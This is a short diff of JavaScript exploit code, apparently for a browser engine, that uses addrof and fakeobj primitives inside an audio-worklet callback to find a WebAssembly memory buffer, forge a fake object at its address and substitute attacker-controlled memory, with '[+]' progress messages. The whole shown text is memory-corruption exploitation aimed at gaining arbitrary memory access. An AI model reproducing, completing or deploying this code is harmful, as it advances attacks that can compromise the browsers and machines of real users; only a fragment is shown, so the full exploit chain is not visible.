@@ -775,14 +775,14 @@ b.process = (inputs, outputs, parameters)=>{
         
         var realWasmMem = new WebAssembly.Memory({inital: 0x1});
         sleep(5);
-        var wasmBufferRawAddr = addrof2(wasmBuffer);
+        var wasmBufferRawAddr = addrof(wasmBuffer);
         if (wasmBufferRawAddr == 0x7ff8000000000000) {
             //print1("[+] Got A NAN address which invalid reloading");
             fail("[+] Got A NAN address which is invalid ... reloading");
         }
         print1('[+] Got WebAssembly buffer at 0x'+wasmBufferRawAddr.toString(16));
         let u = new Int64(wasmBufferRawAddr).toString()[9];
-        var fakeWasmBuffer = fake_obj_at_address(wasmBufferRawAddr+16,parseInt(u));
+        var fakeWasmBuffer = fakeobj(wasmBufferRawAddr+16);
         var maxtry = 0;
         
         if (fakeWasmBuffer instanceof WebAssembly.Memory) {
@@ -803,8 +803,8 @@ b.process = (inputs, outputs, parameters)=>{
         print1('[+] Successfully got fakeobj as WASMObject');
     }*/
         //print1('[+] Successfully got fakeobj as WASMObject');
-        var wasmMemRawAddr = __addrof(wasmInternalMemory);
-        var wasmMem = fake_obj_at_address2(wasmMemRawAddr+16,parseInt(u));    
+        var wasmMemRawAddr = addrof(wasmInternalMemory);
+        var wasmMem = fakeobj(wasmMemRawAddr+16);    
         
         wasmBuffer.memory = wasmMem;
         
